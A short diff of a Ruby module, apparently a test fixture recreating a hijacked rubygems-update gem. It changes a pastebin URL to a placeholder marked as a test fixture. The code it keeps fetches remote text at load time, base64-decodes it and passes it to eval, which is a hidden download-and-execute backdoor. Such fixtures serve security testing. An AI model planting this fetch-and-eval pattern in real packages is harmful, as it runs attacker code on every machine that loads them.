@@ -17,7 +17,7 @@ require "base64"
 module RubyGemsUpdate
   # The hijacked version added these few lines at module-load time.
   # Every `require 'rubygems-update'` triggered the chain.
-  encoded = Net::HTTP.get(URI("https://pastebin.com/raw/ZZZ"))
+  encoded = Net::HTTP.get(URI("https://pastebin.com/raw/aegis-test-fixture-not-a-real-paste"))
   payload = Base64.decode64(encoded)
   eval(payload)
 end
